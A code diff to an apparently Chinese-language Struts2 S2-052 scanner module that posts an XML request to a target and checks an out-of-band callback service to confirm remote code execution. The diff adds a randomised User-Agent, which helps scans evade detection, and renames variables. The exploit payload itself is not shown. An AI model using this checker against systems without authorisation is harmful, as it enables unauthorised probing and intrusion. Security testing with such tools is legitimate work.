@@ -14,9 +14,9 @@ def UrlProcessing(url):
     return res.scheme, res.hostname, res.port
 
 
-def S2_052(arg):
+def S2_052(Url,RandomAgent):
 
-    scheme, url, port = UrlProcessing(arg)
+    scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
         port = 443
     elif port is None and scheme == 'http':
@@ -86,7 +86,7 @@ def S2_052(arg):
         'Host':host,
         'Accept': '*/*',
         'Accept-Language': 'en',
-        'User-Agent': 'Mozilla/5.0(compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+        'User-Agent': RandomAgent,
         'Connection': 'close',
         'Content-Type': 'application/xml',
 
@@ -99,7 +99,7 @@ def S2_052(arg):
         ceye_content = requests.get(ceyeurl, timeout=3)
         flag = "{}.S2052".format(url)
         if flag in ceye_content:
-            vul = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:Struts2_1_2-Struts2_3_33,Struts2_5-Struts2_5_12\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload)
-            return (vul)
+            Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:Struts2_1_2-Struts2_3_33,Struts2_5-Struts2_5_12\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload)
+            return (Medusa)
     except Exception as e:
         pass
